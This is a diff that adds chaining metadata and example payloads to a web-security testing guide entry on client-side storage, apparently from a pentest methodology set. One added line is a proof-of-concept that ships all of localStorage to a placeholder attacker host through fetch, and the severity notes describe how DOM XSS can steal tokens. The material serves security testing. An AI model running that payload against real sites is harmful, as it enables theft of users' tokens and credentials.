@@ -8,9 +8,11 @@ author: cyberstrike-official
 tags: [client-side, javascript, dom, cors, wstg, clnt]
 tech_stack: []
 cwe_ids: [CWE-79]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-clnt-01, wstg-clnt-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-clnt-01: "DOM XSS + auth tokens/session data stored in localStorage (no HttpOnly protection possible) = payload directly exfiltrates long-lived tokens instead of just the session cookie, enabling persistent account takeover beyond the current session — Critical"
+  wstg-clnt-02: "eval()/Function() JS execution primitive + sensitive tokens in localStorage/sessionStorage = arbitrary code reads and exfiltrates all stored credentials/API keys in one shot — Critical"
 ---
 
 # wstg-clnt-12
@@ -396,6 +398,39 @@ done
 | EditThisCookie                     | Cookie editor extension    |
 | Selenium/Puppeteer                 | Automated storage analysis |
 | Burp Suite                         | Cookie analysis            |
+
+---
+
+## Example Commands/Payloads
+
+### Enumerate all client-side storage (browser console)
+
+```javascript
+console.log("localStorage:", { ...localStorage })
+console.log("sessionStorage:", { ...sessionStorage })
+console.log("cookies:", document.cookie)
+indexedDB.databases().then((dbs) => console.log("IndexedDB:", dbs.map((d) => d.name)))
+```
+
+### Sensitive-data grep patterns
+
+```
+password|token|api[_-]?key|secret|credit|ssn|session|auth|bearer|jwt|private
+```
+
+### Cookie attribute check via curl
+
+```bash
+curl -sI "https://{target}" | grep -i "set-cookie"
+# Flag any cookie missing: HttpOnly, Secure, SameSite
+```
+
+### XSS-driven storage exfiltration PoC
+
+```javascript
+// If a stored/DOM XSS sink exists, chain it to steal storage
+fetch("https://attacker.tld/log?data=" + encodeURIComponent(JSON.stringify({ ...localStorage })))
+```
 
 ---
 
